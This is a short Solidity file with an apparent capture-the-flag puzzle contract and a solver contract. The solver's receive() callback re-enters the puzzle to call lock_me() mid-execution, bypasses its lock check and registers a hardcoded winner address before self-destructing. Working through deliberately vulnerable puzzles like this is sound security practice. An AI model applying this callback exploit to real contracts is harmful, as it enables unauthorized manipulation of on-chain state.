pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
interface IChallenge{
    function exploit_me(address winner) external;
    function lock_me() external;
}

contract Challenge is IChallenge {

    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}

contract hackingTrail {

    address private constant challengeAddr = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;

    modifier onlyRoki {
        //require(msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878), "lol how did you even find this?");
        _;
    }

    function hackTrail() external onlyRoki {
        IChallenge challenge = IChallenge(challengeAddr);
        challenge.exploit_me(address(0x798349E06c67272465123B91bd88C5d19b8c7878));
        selfdestruct(payable(0x798349E06c67272465123B91bd88C5d19b8c7878));
    }

    receive() external payable {
        (bool success,) = address(challengeAddr).call(abi.encode(bytes4(keccak256("lock_me()"))));
        
    }
}

